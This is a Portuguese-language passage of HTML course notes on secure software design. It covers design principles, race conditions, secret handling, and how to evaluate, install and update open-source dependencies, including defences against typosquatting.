sequestro; quase todo o resto, não. Softwares podem se comunicar pelo canal, presumindo que estejam se comunicando com o mesmo usuário/software, mas isso é facilmente contornado se o canal puder ser sequestrado.</li> </ul> <h2 id=tentando-executar-software-confiavel-em-ambientes-nao-confiaveis>Tentando executar software confiável em ambientes não confiáveis<a class=headerlink href=#tentando-executar-software-confiavel-em-ambientes-nao-confiaveis title="Permanent link">¶</a></h2> <p><em>Você poderia</em> tentar executar um software confiável em um sistema no qual não confia? Você pode tentar, mas isso geralmente não funciona bem, e tentar fazer isso é um tópico bastante avançado. Aqui estão algumas das técnicas que já foram testadas:</p> <ul> <li>Uma técnica é a criptografia homomórfica. Ela permite executar código enquanto os dados permanecem criptografados. Mas, atualmente, a criptografia homomórfica só é prática em circunstâncias específicas. Ela é muito mais lenta e muito mais complexa.</li> <li>Os mecanismos de CPU Software Guard eXtensions (SGX) da Intel deveriam permitir a execução e o armazenamento de dados, mas, na prática, eles têm sido quebrados repetidamente ( <em><a href=https://arstechnica.com/information-technology/2020/06/new-exploits-plunder-crypto-keys-and-more-from-intels-ultrasecure-sgx/ >Saque de chaves de criptografia do SGX ultrasseguro faz a Intel enlouquecer novamente</a></em> , por Dan Goodin).</li> <li>Se você está tentando proteger jogos em um laptop/desktop e não confia nele, existem sistemas antitrapaça. Mas esses sistemas costumam quebrar. É melhor realizar eventos presenciais onde todos os laptops/desktops sejam seus.</li> </ul> <h2 id=o-restante-dos-principios-de-design-de-saltzer-e-schroeder>O restante dos princípios de design de Saltzer e Schroeder<a class=headerlink href=#o-restante-dos-principios-de-design-de-saltzer-e-schroeder title="Permanent link">¶</a></h2> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Economia de mecanismo (também conhecida como simplicidade)</td> <td>O sistema, em particular a parte da qual a segurança depende, deve ser o mais simples e compacto possível. Isso torna essa parte do sistema mais fácil de revisar e mais difícil de errar. É claro que softwares modernos são frequentemente solicitados a fornecer muitas funcionalidades, então normalmente não é possível tornar tudo extremamente simples, mas você pode pelo menos trabalhar para tornar a parte da qual a segurança depende o mais simples possível.</td> </tr> <tr> <td>Design Aberto</td> <td>O mecanismo de proteção não deve depender da ignorância do invasor. Em vez disso, o mecanismo deve ser público, dependendo do sigilo de relativamente poucos itens (e facilmente alteráveis), como senhas ou chaves privadas. Um design aberto possibilita um amplo escrutínio público. Um design aberto também permite que os usuários se convençam de que o sistema a ser usado é adequado. Francamente, não é realista tentar manter o sigilo de um sistema amplamente distribuído; descompiladores e hardware subvertido podem expor rapidamente quaisquer "segredos" em uma implementação. Uma das grandes vantagens do software de código aberto (OSS) é que ele implementa melhor o princípio do design aberto; o código-fonte do OSS tem um design aberto, permitindo que qualquer pessoa o revise e faça alterações para potencialmente melhorá-lo. É claro que o OSS precisa <em>ser</em> revisado para que isso ajude, mas é uma vantagem <em>potencial</em> importante.</td> </tr> <tr> <td>Padrões à prova de falhas (também conhecidos como padrões à prova de falhas)</td> <td>A instalação padrão deve ser a instalação segura. Se não houver certeza de que algo deve ser permitido, não permita. Por exemplo, não distribua software com uma senha vazia ou padrão; em vez disso, <em>exija</em> que uma nova senha seja definida durante a instalação do software. Dessa forma, se alguém simplesmente instalá-lo rapidamente, ele não apresentará uma vulnerabilidade devido a uma senha conhecida. Certifique-se de que as permissões padrão sejam seguras; a categoria de vulnerabilidade <a href=https://cwe.mitre.org/data/definitions/276.html>CWE-276</a> é <em>Permissões Padrão Incorretas</em>.</td> </tr> <tr> <td>Separação de privilégios</td> <td>O acesso aos objetos deve depender de mais de uma condição para que a violação de uma condição não implique na violação de tudo. Em resumo, certifique-se de que, se o seu software tiver um mecanismo de login, ele ofereça suporte à autenticação de dois fatores (2FA).</td> </tr> <tr> <td>Mecanismo menos comum</td> <td>Minimize a quantidade e o uso de mecanismos compartilhados se os compartilhadores tiverem privilégios diferentes. Evite compartilhar arquivos, diretórios, execução do kernel do sistema operacional ou computadores com algo em que você não confia, pois invasores podem explorá-los. É claro que, em muitos casos, isso é compensado por outros fatores. Um exemplo óbvio são os serviços de nuvem: em alguns casos, usar um serviço de nuvem pode fazer com que seu programa seja executado em um ambiente compartilhado com um adversário. No caso de serviços de nuvem, muitas vezes há fatores atenuantes que o tornam aceitável (por exemplo, o provedor de serviços de nuvem pode fornecer uma série de medidas para proporcionar melhor isolamento e/ou pode ter uma equipe mais experiente protegendo e monitorando os sistemas do que você). Dito isso, ainda é verdade que qualquer coisa que você compartilhe com um invasor pode adicionar outra maneira de ele ser atacado. Se esse compartilhamento for muito arriscado para o seu aplicativo, você pode escolher alternativas com menos compartilhamento (como uma nuvem de locatário único ou uma nuvem privada). Em alguns casos, o compartilhamento pode reduzir custos, mas aumentar os riscos de segurança. A melhor decisão depende das circunstâncias, e tudo o que os princípios de design podem fazer é ajudar você a identificar a compensação.</td> </tr> <tr> <td>Aceitabilidade psicológica</td> <td>A interface humana deve ser projetada para facilitar o uso, para que os usuários utilizem os mecanismos de proteção de forma correta, rotineira e automática. Erros serão reduzidos se os mecanismos de segurança corresponderem à imagem mental do usuário sobre seus objetivos de proteção. Algumas pessoas pensam que sempre há uma relação entre segurança e facilidade de uso, mas isso geralmente não é verdade; se algo é difícil de usar, geralmente é inseguro na prática (porque as pessoas tentam contornar isso). Uma baixa facilidade de uso por motivos de segurança geralmente indica que o software não foi projetado para ser seguro; esperamos que os cursos deste programa de certificação profissional ajudem você a evitar isso!</td> </tr> <tr> <td></td> <td></td> </tr> </tbody> </table> <h1 id=outros-principios-de-design-cuidado-com-as-condicoes-de-corrida>Outros princípios de design: cuidado com as condições de corrida<a class=headerlink href=#outros-principios-de-design-cuidado-com-as-condicoes-de-corrida title="Permanent link">¶</a></h1> <p>Muitos outros princípios de design foram propostos, com base em problemas que ocorreram em sistemas anteriores. A seguir, veremos alguns outros princípios de design que você deve considerar.</p> <p>Uma <em>condição de corrida</em> ocorre quando o comportamento correto de um sistema depende da sequência de eventos, mas não há controle sobre essa sequência. Condições de corrida geralmente envolvem um ou mais processos ou threads acessando um recurso compartilhado, mas esse acesso múltiplo não foi controlado adequadamente.</p> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/k2c90ol777vs-rsz_racecars_generated_by_openais_dall-e-2.png><img alt="Um carro de corrida azul e um carro de corrida vermelho correndo para a linha de chegada em frente a uma cidade futurista" src=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/k2c90ol777vs-rsz_racecars_generated_by_openais_dall-e-2.png></a></p> <p><strong>Carros de corrida gerados pelo <a href=https://openai.com/dall-e-2/ >Dall-e-2 da OpenAI</a></strong></p> <p>Se não houver controle algum, isso é um defeito e pode até ser uma vulnerabilidade. Muitos programas, para serem seguros, precisam fazer duas coisas: (1) determinar se uma solicitação é autorizada e (2) se for, agir de acordo com essa solicitação. Se for possível para um invasor alterar a situação entre as etapas 1 e 2, o programa poderá determinar corretamente que está autorizado, mas então permitir uma ação diferente que <em>não</em> foi autorizada. Esse tipo de erro de segurança é tão comum que tem um nome: uma condição de corrida <em>tempo de verificação - tempo de uso</em> (TOCTOU).</p> <p>Em muitas situações, a maneira correta de combater as condições de corrida TOCTOU é implementar e usar APIs que verifiquem a autorização e executem a ação <em>simultaneamente</em> (ou seja, não permitam que um invasor altere a situação entre a verificação e o uso). Por exemplo:</p> <ul> <li>Ao criar arquivos ou qualquer outro objeto que tenha privilégios associados, não os crie e tente reduzir seus privilégios. Em vez disso, crie-os com privilégios mínimos e expanda-os conforme necessário. Dessa forma, não há espaço de tempo em que um invasor possa explorar o excesso de permissões.</li> <li>Se você estiver escrevendo um programa para um sistema do tipo Unix, não chame <strong>access()</strong> para verificar se um arquivo pode ser aberto, seguido de uma chamada a <strong>open()</strong> para efetivamente abrir o arquivo. Em vez disso, configure tudo para chamar <strong>open()</strong> diretamente, já que <strong>open()</strong> inclui uma verificação para verificar se o acesso é permitido.</li> <li>Se você quiser garantir a criação de um novo arquivo em um sistema do tipo Unix, certifique-se de solicitar que ele seja criado <em>exclusivamente</em> ( <strong>O_EXCL</strong> na API <strong>open() do C</strong> , a letra <strong>x</strong> em <strong>fopen()</strong> e os sinalizadores de opção usados ​​em muitas outras linguagens de programação). Novamente, dessa forma, não há janela de oportunidade para um invasor criar o arquivo antes que o programa o faça (se o invasor puder fazê-lo).</li> </ul> <p>Um erro relativamente comum em sistemas do tipo Unix é a criação insegura de arquivos temporários. Arquivos temporários podem ser criados em um diretório onde um invasor pode influenciar a criação e os nomes de outros arquivos. Se um invasor criar um arquivo primeiro e o aplicativo solicitar a "criação" de um arquivo sem solicitar que ele seja exclusivo, o arquivo existente controlado pelo invasor será reutilizado. Simplesmente usar a opção exclusiva não é suficiente, pois isso ainda permitiria uma negação de serviço. A solução é usar um loop simples que cria um nome de arquivo "aleatório" no diretório pretendido e, em seguida, tentar criar exclusivamente com privilégios limitados ao máximo.</p> <p>A maioria das linguagens possui uma rotina ou comando para criar arquivos temporários com segurança; use-os onde disponíveis. Em Python, o módulo <strong>tempfile</strong> pode criar arquivos temporários com segurança. Scripts de shell podem usar o comando <strong>mktemp</strong> para criar arquivos temporários com segurança.</p> <p><strong>Observação:</strong> Condições de corrida são uma causa tão comum de vulnerabilidades de segurança que estão na lista CWE Top 25 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/33 title="GitHub Issue: squidfunk/mkdocs-material #33">#33</a> de 2021 e CWE Top 25 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/29 title="GitHub Issue: squidfunk/mkdocs-material #29">#29</a> de 2019. <em>Execução simultânea usando recurso compartilhado com sincronização inadequada ('Condição de corrida')</em> é <a href=https://cwe.mitre.org/data/definitions/362.html>CWE-362</a>. <em>Arquivo temporário inseguro</em> é <a href=https://cwe.mitre.org/data/definitions/377.html>CWE-377</a>.</p> <h1 id=outros-principios-de-design-cont>Outros princípios de design (cont.)<a class=headerlink href=#outros-principios-de-design-cont title="Permanent link">¶</a></h1> <h2 id=fortalecer-o-sistema>Fortalecer o sistema<a class=headerlink href=#fortalecer-o-sistema title="Permanent link">¶</a></h2> <p>Defeitos acontecem! Mas eles não precisam se transformar em vulnerabilidades. Em vez disso, tente projetar seu sistema de forma que um único defeito tenha muito menos probabilidade de resultar em comprometimento total. Esta é basicamente uma aplicação específica do princípio do privilégio mínimo, mas, se você pensar especificamente em tornar o sistema difícil de subverter, <em>mesmo</em> quando há um defeito, poderá identificar outras medidas que pode tomar.</p> <p>Existem muitos mecanismos que podem fortalecer um sistema. Exemplos incluem a Política de Segurança de Conteúdo (CSP) e a Randomização do Layout do Espaço de Endereço (ASLR). Discutiremos alguns mecanismos de fortalecimento mais adiante no curso. A questão aqui é que você deve habilitar os mecanismos de fortalecimento ou garantir que seus usuários possam habilitá-los.</p> <h2 id=mantenha-os-segredos-em-segredo>Mantenha os segredos em segredo<a class=headerlink href=#mantenha-os-segredos-em-segredo title="Permanent link">¶</a></h2> <p>Se o seu software gerencia segredos como chaves criptográficas privadas e senhas, certifique-se de que eles permaneçam secretos. Em particular:</p> <ul> <li>Não insira segredos ativos no seu código-fonte. O código-fonte é gerenciado por sistemas de controle de versão e frequentemente se espalha para mais pessoas e sistemas do que você imagina.</li> <li>Armazene as senhas usadas para autenticação de entrada com um algoritmo projetado especificamente para isso. Discutiremos isso posteriormente ao longo dos cursos deste programa de certificação profissional, mas esses tipos de algoritmos são chamados de algoritmos <em>de hash salted iterados por usuário</em> (como argon2id, bcrypt ou PBKDF2). Se feito corretamente, é inviável para um invasor determinar muitas senhas, mesmo que obtenha os dados criptografados da senha.</li> <li>Use <strong>https://</strong> em vez de <strong>http://</strong> ; isso fornece um link criptografado para evitar vazamento de dados.</li> <li>Evite aceitar e enviar dados secretos (como chaves privadas) como parâmetros de linha de comando, sempre que possível; os parâmetros de linha de comando geralmente são visíveis para outros processos em um sistema.</li> </ul> <h2 id=confie-apenas-em-canais-confiaveis>Confie apenas em canais confiáveis<a class=headerlink href=#confie-apenas-em-canais-confiaveis title="Permanent link">¶</a></h2> <p>Em geral, confie apenas em informações (entradas ou resultados) de canais confiáveis. Por exemplo, use <strong>https://</strong> em vez de <strong>http://</strong> ao contatar um servidor, pois isso permite verificar se o servidor possui um certificado criptográfico válido para aquele site. Em geral, você deve usar <strong>https,</strong> pois isso impedirá que invasores bisbilhotem ou modifiquem informações trocadas com outros usuários.</p> <hr> <h2 id=separar-dados-do-controle>Separar dados do controle<a class=headerlink href=#separar-dados-do-controle title="Permanent link">¶</a></h2> <p>Um truque útil para desenvolver software mais seguro é separar os dados do controle (também conhecidos como programas). Em outras palavras, você deve separar os dados passivos dos programas que são executados. Dessa forma, se um invasor conseguir inserir informações "extras" nos dados, isso não causará a execução de um programa potencialmente malicioso. Esta é basicamente outra maneira de implementar o privilégio mínimo: não conceder aos dados o direito de serem executados como um programa.</p> <p>Um bom exemplo disso é a Política de Segurança de Conteúdo (CSP), suportada por navegadores modernos. A CSP permite declarar que o HTML enviado contém apenas dados e <em>não</em> permite o fornecimento de scripts (programas) ou estilos (que também podem ser programas) em linha. Em vez disso, os scripts e estilos só podem ser baixados de locais confiáveis ​​especificados. Dessa forma, se um invasor conseguir subverter o HTML, ele não conseguirá executar os programas fornecidos por ele.</p> <p><strong>Observação:</strong> o design inseguro é um erro tão comum em aplicativos da web que está na quarta posição do OWASP Top 10 de 2021.</p> <h2 id=nocoes-basicas-de-reutilizacao-de-software>Noções básicas de reutilização de software<a class=headerlink href=#nocoes-basicas-de-reutilizacao-de-software title="Permanent link">¶</a></h2> <p>Ao desenvolver software, você normalmente reutiliza muitos outros softwares.</p> <p>Isso pode incluir um sistema operacional, um ambiente de execução de contêiner, frameworks, bibliotecas, extensões, plug-ins, temas e assim por diante.</p> <p>Normalmente, você também usará ferramentas de desenvolvimento desenvolvidas por outros. Esse software reutilizado, e como você o obtém, pode impactar significativamente a segurança do resultado.</p> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=../img/Pasted%20image%2020250519062911.png><img alt="Pasted image 20250519062911.png" src=../img/Pasted%20image%2020250519062911.png></a></p> <p>Alguns consideram a seleção de software reutilizado como parte do design, visto que impacta claramente a forma como dividimos o problema.</p> <p>Outros podem descrever isso como uma categoria própria, por exemplo, cadeia de suprimentos. Não importa como você a chame, é importante. Em geral, os sistemas de software hoje são, em sua maioria, software reutilizado de outro lugar.</p> <p>Muitos sistemas suportam a instalação de extensões desenvolvidas e mantidas separadamente do programa "núcleo" (geralmente por desenvolvedores diferentes).</p> <p>As extensões precisam ser avaliadas separadamente antes de serem instaladas.</p> <p>O sistema núcleo pode ser relativamente seguro, mas isso não significa que todas as suas extensões sejam seguras, e frequentemente os maiores riscos vêm delas. Essas extensões podem ser chamadas de <strong>vários nomes, incluindo extensões, plug-ins, complementos, temas, componentes ou pacotes</strong>.</p> <p>Na maioria dos casos, a maior parte do código de um aplicativo de software é software reutilizado que é licenciado como <strong>software de código aberto (OSS)</strong>. OSS é, resumidamente, software onde os usuários têm a liberdade de executar, copiar, distribuir, estudar, alterar e melhorar o software (esta é, na verdade, a Definição de Software Livre ).</p> <p>Uma definição muito amplamente usada e mais detalhada de OSS é a <strong>Definição de Código Aberto (OSD)</strong> da <strong>Iniciativa de Código Aberto (OSI)</strong> , que também mantém uma lista de Licenças Aprovadas pela OSI.</p> <p>O software licenciado como OSS pode ser revisado e desenvolvido colaborativamente em todo o mundo. Estudos mostram que a porcentagem média de OSS em aplicativos de software está em algum lugar entre 77% ( Black Duck, 2024 ) e 90% ( Sonatype, 2024 ).</p> <p>Como é tão comum, vamos nos concentrar em dicas sobre como avaliar softwares de código aberto antes de reutilizá-los. Muitas dessas dicas também se aplicam à avaliação de softwares de código fechado.</p> <h2 id=selecionando-avaliando-software-de-codigo-aberto>Selecionando (Avaliando) Software de Código Aberto<a class=headerlink href=#selecionando-avaliando-software-de-codigo-aberto title="Permanent link">¶</a></h2> <p>Há muitas coisas importantes a considerar ao selecionar um software de código aberto (OSS).</p> <p>A Open Source Security Foundation (OpenSSF) desenvolveu um <a href=https://github.com/ossf/wg-best-practices-os-developers/blob/main/docs/Concise-Guide-for-Evaluating-Open-Source-Software.md#readme><em>Guia Conciso para Avaliação de Software de Código Aberto que</em></a> pode ajudar.</p> <p>Eles sugerem que, "Como desenvolvedor de software, antes de usar dependências ou ferramentas de software de código aberto (OSS), identifique candidatos e avalie os principais em relação às suas necessidades. Para avaliar uma possível dependência de OSS para segurança e sustentabilidade, considere estas perguntas...".</p> <p>Por questões de segurança, aqui estão algumas coisas a considerar:</p> <table> <thead> <tr> <th></th> <th></th> </tr> </thead> <tbody> <tr> <td>Você pode evitar adicioná-lo?</td> <td>É possível usar uma dependência existente (possivelmente indireta)? Cada nova dependência aumenta a superfície de ataque (uma subversão da nova dependência, ou de suas dependências transitivas, pode subverter o sistema).</td> </tr> <tr> <td>Você está avaliando a versão pretendida?</td> <td>Certifique-se de que está avaliando a versão pretendida do software, não uma bifurcação pessoal ou controlada por um invasor. Essas técnicas ajudam a combater o ataque comum de "typosquatting" (em que um invasor cria um nome "quase correto").<br><br><strong>a.</strong> Verifique o nome e o site do projeto para obter o link. <br><strong>b.</strong> Verifique a relação de bifurcação no GitHub/GitLab.<br><strong>c.</strong> Verifique se o projeto é afiliado a uma fundação (nesse caso, você deve conseguir acessar a fonte oficial no site da fundação).<br><strong>d.</strong> Verifique o horário de criação e sua popularidade.</td> </tr> <tr> <td>É mantido?</td> <td>Software sem manutenção é um risco; a maioria dos softwares precisa de manutenção contínua. Se não for mantido, provavelmente também será inseguro.<br><br><strong>a.</strong> Houve alguma atividade recente significativa (por exemplo, confirmações) no último ano?<br><strong>b.</strong> Quando foi seu último lançamento (foi há menos de um ano)?<br><strong>c.</strong> Há mais de um mantenedor, idealmente de organizações diferentes?<br><strong>d.</strong> Há lançamentos ou anúncios recentes de seus mantenedores?<br><strong>e.</strong> A sequência de versão indica instabilidade (por exemplo, começa com "0", inclui "alfa" ou "beta", etc.)</td> </tr> <tr> <td><br>Há evidências de que seus desenvolvedores trabalham para torná-lo seguro?</td> <td><strong>a.</strong>  Determine se o projeto ganhou (ou está a caminho de ganhar) um <a href=https://www.bestpractices.dev/en>selo de Melhores Práticas da Open Source Security Foundation (OpenSSF)</a>.<br><strong>b.</strong> Examine as informações em <a href=https://deps.dev/ >https://deps.dev</a> , incluindo sua pontuação <a href=https://github.com/ossf/scorecard>OpenSSF Scorecards</a> e quaisquer vulnerabilidades conhecidas.<br><strong>c.</strong>  Determine se as dependências do pacote estão (relativamente) atualizadas.<br><strong>d.</strong> Determine se há documentação explicando por que é seguro (também conhecido como "caso de garantia").<br><strong>e.</strong> Há testes automatizados incluídos no pipeline de CI? Qual é a cobertura dos testes?<br><strong>f.</strong> O projeto corrige bugs (especialmente de segurança) em tempo hábil? Eles lançam correções de segurança para versões mais antigas? Eles têm uma versão LTS (Long Time Support)?<br><strong>g.</strong> Os desenvolvedores usam recursos de segurança de hospedagem de código quando aplicável (por exemplo, se estiverem no GitHub ou GitLab, eles usam proteção de branch)?<br><strong>h.</strong> Identifique auditorias de segurança e se os problemas encontrados foram corrigidos. Auditorias de segurança são relativamente incomuns, mas consulte <a href=https://github.com/ossf/security-reviews>as "Análises de Segurança"</a> do OpenSSF.<br><strong>i.</strong> Use <a href=https://safecode.org/resource-managing-software-security/principles-of-software-assurance-assessment/ >o guia Princípios para Avaliação de Garantia de Software (2019) do SAFECode</a> , uma abordagem multicamadas para examinar a segurança do software.<br><strong>j.</strong>  Como eles se saem de acordo com o Guia de Referência de Garantia de Segurança <a href=https://www.openchainproject.org/ >do OpenChain (o</a> <a href=https://www.openchainproject.org/security-guide>guia de agosto de 2021</a> e <a href=https://github.com/OpenChain-Project/SecurityAssuranceGuide/tree/main/Guide/2.0>a versão mais recente</a> estão disponíveis)?<br><strong>k.</strong> Eles aplicam muitas práticas do <a href=https://github.com/ossf/wg-best-practices-os-developers/blob/main/docs/Concise-Guide-for-Evaluating-Open-Source-Software.md#readme>Guia Conciso para Desenvolvimento de Software Mais Seguro</a> ?</td> </tr> <tr> <td>É fácil de usar com segurança?</td> <td>- A configuração padrão e os "exemplos simples" são seguros (por exemplo, criptografia ativada por padrão em protocolos de rede)? Caso contrário, evite-os.<br>- A interface/API foi projetada para ser fácil de usar com segurança (por exemplo, se a interface implementa uma linguagem, ela suporta consultas parametrizadas)?<br>- Há alguma orientação sobre como usá-lo com segurança?</td> </tr> <tr> <td>Há instruções sobre como relatar vulnerabilidades?</td> <td>Consulte o <a href=https://github.com/ossf/oss-vulnerability-guide/blob/main/maintainer-guide.md>Guia para implementar um processo coordenado de divulgação de vulnerabilidades para projetos de código aberto</a> para obter orientação sobre projetos OSS.</td> </tr> <tr> <td>Tem uso significativo?</td> <td>Softwares com muitos usuários ou com grande número de usuários podem ser inadequados para o seu uso. No entanto, softwares amplamente utilizados têm maior probabilidade de oferecer informações úteis sobre como usá-los com segurança, e mais pessoas se importarão com sua segurança. Verifique se um nome semelhante é mais popular – isso pode indicar um ataque de typosquatting.</td> </tr> <tr> <td>Qual é a licença do software?</td> <td>Tecnicamente, licenças não são segurança, mas podem ter um impacto significativo na segurança e na sustentabilidade. Certifique-se de que cada componente tenha uma licença, que seja uma <a href=https://opensource.org/licenses>licença OSI</a> amplamente utilizada , se for OSS, e que seja consistente com o uso pretendido. Projetos que não fornecem informações claras sobre a licença têm menos probabilidade de seguir outras boas práticas que levam à segurança do software.</td> </tr> <tr> <td>Qual é a sua avaliação do código dele?</td> <td>Mesmo uma breve revisão do código-fonte do software e suas mudanças ao longo do tempo pode lhe dar algumas dicas. Aqui estão alguns pontos a considerar:<br><br>- Ao revisar o código-fonte, há evidências no código de que os desenvolvedores estavam tentando desenvolver um software seguro (como validação rigorosa de entradas não confiáveis ​​e uso de instruções parametrizadas)?<br>- Há evidências de software inseguro/incompleto (por exemplo, muitas instruções TODO)?<br>- Quais são os "principais" problemas relatados pelas ferramentas de análise estática?<br>- Há evidências de que o software é malicioso? De acordo com a <a href=https://arxiv.org/abs/2005.09535><em>Backstabber's Knife Collection</em></a> , verifique se há malícia nos scripts/rotinas de instalação, verifique se há vazamento de dados de ~/.ssh e variáveis ​​de ambiente e procure por valores codificados/ofuscados que são executados. Examine os commits mais recentes em busca de código suspeito (um invasor pode tê-los adicionado recentemente).<br>- Considere executar o software em uma sandbox para tentar acionar e detectar código malicioso.<br>- Considere executar todos os casos de teste definidos para garantir que o software seja aprovado.</td> </tr> <tr> <td>Outros recursos que você pode considerar incluem: </td> <td></td> </tr> </tbody> </table> <ul> <li><a href=https://tidelift.com/subscription/choosing-open-source-packages-well>Guia Tidelift para escolher bem os pacotes (fevereiro de 2021)</a> , Tidelift</li> <li><a href=https://dwheeler.com/oss_fs_eval.html>Como avaliar programas de software de código aberto/software livre (OSS/SL)</a></li> </ul> <p>Eles incluem a página inicial do projeto e/ou o repositório de código-fonte, a página principal do repositório de pacotes padrão de um ecossistema, <a href=https://deps.dev/ >deps.dev</a> , <a href=https://metrics.openssf.org/ >metrics.openssf.org</a> , <a href=https://libraries.io/ >libraries.io</a> , Synopsys Black Duck <a href=https://www.openhub.net/ >OpenHub</a> e Linux Foundation <a href=https://lfx.linuxfoundation.org/ >LFX</a>.</p> <p>A maioria dessas perguntas também se aplica ao software de código fechado que é reutilizado.</p> <p>A maioria dos softwares depende de outros softwares, que por sua vez frequentemente dependem de outros softwares com muitas camadas.</p> <p>Uma lista de materiais de software (SBOM) é um inventário aninhado que identifica os componentes de software que compõem um software maior.</p> <p>Muitos ecossistemas têm formatos SBOM específicos para cada ecossistema.</p> <p>Há também alguns formatos SBOM que suportam ecossistemas arbitrários: <a href=https://spdx.dev/ >Software Package Data Exchange (SPDX)</a> , <a href=https://csrc.nist.gov/Projects/Software-Identification-SWID/ >Software ID (SWID)</a> e <a href=https://github.com/CycloneDX/specification>CycloneDX</a>.</p> <p>Quando um SBOM está disponível para um componente que você está pensando em usar, geralmente é mais fácil usar esses dados para ajudar a responder algumas das perguntas listadas acima. Também é bom fornecer um SBOM para usuários em potencial do seu software, pelos mesmos motivos.</p> <h2 id=baixando-e-instalando-software-reutilizavel>Baixando e instalando software reutilizável<a class=headerlink href=#baixando-e-instalando-software-reutilizavel title="Permanent link">¶</a></h2> <p>Claro, baixar e instalar uma versão corrompida do software reutilizado pode ser um problema sério. Portanto, certifique-se de obter a versão <em>correta</em> do software:</p> <p><strong>Certifique-se de ter o nome correto. **Um ataque comum é chamado de "typosquatting"</strong>. No typosquatting, um invasor cria um nome de pacote ou domínio que é intencional e maliciosamente semelhante a um componente de software amplamente utilizado e usa esse nome enganoso para disseminar uma versão maliciosa desse software. <a href=https://arxiv.org/abs/2005.09535>A Ohm &amp; all, 2020,</a> descobriu que <em>"a maioria dos pacotes maliciosos [OSS] imitam nomes de pacotes existentes por meio de typosquatting"</em>. Por exemplo:</p> <p><strong>a.</strong>  Verifique se há alterações de nomes enganosas comuns. É fácil alternar entre hífen ( <strong>-</strong> ) e sublinhado ( <strong>_</strong> ). Um ( <strong>1</strong> ) e L minúsculo ( ****l**** ) parecem semelhantes, assim como zero ( ****0**** ) e O maiúsculo ( ****O**** ). Em alguns gerenciadores de pacotes, ASCII maiúsculo e minúsculo são considerados diferentes; nessas situações, cuidado com a diferenciação entre maiúsculas e minúsculas. O Unicode fornece caracteres que parecem exatamente iguais ao ASCII, mas são de outro alfabeto, como o cirílico ou o grego; em alguns casos, eles também podem ser explorados.</p> <p><strong>b.</strong>  Verifique a popularidade do pacote. Geralmente, a versão mais popular é a correta. Para pacotes, compare a contagem de downloads e o número de pacotes amplamente utilizados, dependendo do pacote, com pacotes com nomes semelhantes. Aqueles com contagens mais baixas podem ser alvos de ataques de typosquatting. Considere usar um mecanismo de busca para identificar o pacote ou domínio mais popular. No entanto, certifique-se de <em>ignorar</em> todos os domínios anunciados em um mecanismo de busca; invasores podem pagar para anunciar sua versão maliciosa!</p> <p><strong>c.</strong>  Verifique a data de lançamento do pacote. A mais antiga geralmente é a que você queria.</p> <h2 id=atualizando-componentes-de-software-reutilizados>Atualizando componentes de software reutilizados<a class=headerlink href=#atualizando-componentes-de-software-reutilizados title="Permanent link">¶</a></h2> <p>Na prática, você terá muitos componentes de software reutilizados, e eles precisarão ser atualizados ocasionalmente. Às vezes, uma vulnerabilidade será encontrada em um deles, e nesse caso você precisa ser notificado rapidamente e estar preparado para uma atualização rápida. Como resultado, você precisa gerenciar os componentes reutilizados:</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Use gerenciadores de pacotes, sistemas de controle de versão, ferramentas de construção e testes automatizados para que você possa determinar facilmente quais versões você tem de cada componente reutilizado e possa atualizar qualquer uma delas rapidamente.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Confie apenas em interfaces e comportamentos <em>documentados</em> e evite interfaces obsoletas para maximizar a probabilidade de conseguir atualizar software reutilizado quando necessário.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> <em>Espere</em> atualizar o software que você usa, incluindo sua plataforma subjacente. É tolice presumir que um software nunca precisará ser atualizado rapidamente.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Não modifique o OSS e crie sua própria "bifurcação local". Se uma vulnerabilidade for corrigida em uma versão posterior desse OSS, será cada vez mais difícil incorporar essa correção. Em vez disso, se você precisar modificar algum OSS para atender às suas necessidades, trabalhe com o projeto original do OSS para incorporar suas melhorias à versão oficial. Assim, versões mais recentes desse OSS, incluindo aquelas que corrigem vulnerabilidades, também incluirão os recursos necessários.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Mantenha seu software reutilizado relativamente atualizado. Se seus componentes reutilizados estiverem muito desatualizados, pode ser muito difícil substituir uma versão vulnerável por uma versão corrigida.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Monitore para determinar se alguma das versões de software que você usa teve uma vulnerabilidade publicamente conhecida descoberta. Discutiremos isso mais adiante na seção sobre análise de composição de software (SCA).</li> </ul> <h2 id=atualizando-como-voce-usa-software-reutilizado-evitesubstitua-interfaces-obsoletas>Atualizando como você usa software reutilizado (evite/substitua interfaces obsoletas)<a class=headerlink href=#atualizando-como-voce-usa-software-reutilizado-evitesubstitua-interfaces-obsoletas title="Permanent link">¶</a></h2> <p>Você não precisa atualizar apenas os componentes que usa, mas também a maneira como os usa.</p> <p>Quando os componentes são atualizados, eles às vezes substituem sua interface por uma interface nova/aprimorada em vez de uma interface obsoleta/obsoleta.</p> <p>Sempre que possível, você deve evitar ou substituir qualquer uso de interfaces obsoletas/obsoletas de outros componentes. Às vezes, a interface fica obsoleta devido a uma vulnerabilidade de segurança.</p> <p>Além disso, essas interfaces obsoletas geralmente são descartadas com o tempo; portanto, se você usar a interface obsoleta, pode ser impossível atualizar rapidamente se uma vulnerabilidade for encontrada posteriormente.</p> <p>Se você estiver tornando obsoleta uma interface usada por outros, faça o possível para fornecer um longo período de transição, durante o qual tanto a interface antiga quanto a nova estejam disponíveis.</p> <p>Alguns projetos não conseguirão migrar facilmente, e isso pode levar tempo. Tentar forçar uma atualização rápida geralmente sai pela culatra e faz com que os usuários <em>rejeitem</em> suas atualizações ou adiem o uso delas, o que pode levar a problemas de segurança a longo prazo.</p> <h2 id=implementacao-da-validacao-de-entrada>Implementação da Validação de Entrada<a 